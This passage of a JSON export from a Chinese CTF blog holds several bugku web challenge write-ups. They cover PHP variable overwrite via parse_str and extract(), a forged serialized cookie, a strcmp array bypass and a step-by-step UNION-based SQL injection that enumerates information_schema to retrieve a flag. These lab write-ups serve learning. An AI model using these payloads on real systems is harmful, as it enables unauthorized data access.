‘ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a’; $parsed = parse_url($SERVER[‘REQUEST_URI’]);if(isset($parsed[“query”])){ $query = $parsed[“query”]; $parsed_query = parse_str($query); if($parsed_query!=NULL){ $action = $parsed_query[‘action’]; } if($action===”auth”){ $key = $_GET[“key”]; $hashed_input = hash(‘sha256’, $key); if($hashed_input!==$hashed_key){ die(““); } echo $flag; }}else{ show_source(__FILE);}?&gt; 我们只需构造一个get传入是action=auth且将hashed_key变量进行覆盖，传入你想传入的经过sha256后的值最后传入key即可样本?action=auth&amp;hashed_key=xxxxxxx&amp;key=xxx","categories":[],"tags":[]},{"title":"flag.php bugku  web","slug":"flag.php bugku  web","date":"2019-12-16T02:37:33.839Z","updated":"2019-12-29T02:30:26.206Z","comments":true,"path":"2019/12/16/flag.php bugku  web/","link":"","permalink":"http://yoursite.com/2019/12/16/flag.php%20bugku%20%20web/","excerpt":"bugku web flag.php","text":"bugku web flag.php 打开题目网页首先尝试了一下简单的sql注入但是没用想了一会后，发现提示hint所以我们尝试一下使用get方法传入hint任意值即?hint=1传入后发现一页代码 1234567891011121314151617181920212223242526272829303132333435 &lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];if(isset($_GET[&#39;hint&#39;]))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;)&#123; echo &quot;$flag&quot;;&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;&lt;title&gt;Login&lt;&#x2F;title&gt;&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;br&gt;&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt; &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt; &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt; &lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php&#125;$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;?&gt; 之后我们查看开头的代码发现要将cookie指进行序列化后使与key值相等即可得到flag但是注意：下方的key值并不是我们需要的而我们需要的key值在程序中并没有赋值因此为NULL所以有 1234&lt;?php$KEY&#x3D;&quot;&quot;;print(serialize($KEY));?&gt; 因为我们并没有对$key进行赋值因此求序列化的程序如上所示之后我们可以使用火狐上的hackbar上传cookies即ISecer=s:0:””%3b因为；无法上传 ， 因此我们使用其的url码上传注意，上传的时候要在没有get hint的页面中进行否则无法显示flag 萌新 还请大佬指教邮箱：497710073@qq.com","categories":[],"tags":[]},{"title":"extract（）变量漏洞","slug":"extract（）变量漏洞","date":"2019-12-16T02:37:33.823Z","updated":"2019-12-29T02:30:23.374Z","comments":true,"path":"2019/12/16/extract（）变量漏洞/","link":"","permalink":"http://yoursite.com/2019/12/16/extract%EF%BC%88%EF%BC%89%E5%8F%98%E9%87%8F%E6%BC%8F%E6%B4%9E/","excerpt":"php代码审计日志一（bugku extract变量覆盖）","text":"php代码审计日志一（bugku extract变量覆盖） 题目来源：bugku代码为：我们先了解一下extract（）函数之后我们再了解一下php中的extract（）漏洞 第一次我所构造的为：?shiyan=1&amp;flag=1但是不行我查了一些大佬的wp后发现有：之后我们就可以得到flag","categories":[],"tags":[]},{"title":"csdn_export_md","slug":"csdn_export_md","date":"2019-12-16T02:37:33.807Z","updated":"2019-12-29T02:30:20.693Z","comments":true,"path":"2019/12/16/csdn_export_md/","link":"","permalink":"http://yoursite.com/2019/12/16/csdn_export_md/","excerpt":"代码审计之strcmp（）漏洞","text":"代码审计之strcmp（）漏洞 先了解一下此漏洞：strcmp(str1,str2)比较两个字符串，如果相等就返回0。 在5.3版本前，如果传入的不是字符串，那么会报错，并且return 0，返回0就代表相等了。绕过strcmp就想办法传入数组吧，只需要v3[]=3即可。 之后我们通过一个题来做一个例子： 12345678910&lt;?php$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&#39;a&#39;])) &#123;if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。&#x2F;&#x2F;比较两个字符串（区分大小写）die(&#39;Flag: &#39;.$flag);elseprint &#39;No&#39;;&#125;?&gt; 因此我们可以构造?a[]=1即可得到flag","categories":[],"tags":[]},{"title":"bugku成绩单","slug":"bugku成绩单","date":"2019-12-16T02:37:33.714Z","updated":"2019-12-29T02:30:16.448Z","comments":true,"path":"2019/12/16/bugku成绩单/","link":"","permalink":"http://yoursite.com/2019/12/16/bugku%E6%88%90%E7%BB%A9%E5%8D%95/","excerpt":"bugku成绩单 详细解析","text":"bugku成绩单 详细解析 1，我们首先分别输入1,2,3，均有输出我们输入1’没有回响因此我们可以判断存在sql注入2.我们分别输入 12341&#39; order by 1#1&#39; order by 2#1&#39; order by 3#1&#39; order by 4# 均有回响但是当我们使用 11&#39; order by 5# 时，没有回响因此我们可以根据此判断字段数为43，之后就是最精彩的地方了之后我们联合查询我们先输入注意（select好像tm的不是查询，，好像是赋值。。） 11&#39; union select 1,2,3,4# 没有显示有用的东西因为id=1 所以我们的东西被覆盖因此呢我们输入 15&#39; union select 1,2,3,database()# 即设置一个新的id，我们要select的值会显示在表上（覆盖）现在我们得到了一个数据库的名字之后就进行爆表5’union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#得到之后再进行获得里面的列‘ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#得到我们得到了列之后我们获取我们要得到的东西5’ union select 1,2,3,skctf_flag from fl4g#得到flag 之后我会写一些关于sql语句的总结","categories":[],"tags":[]}]}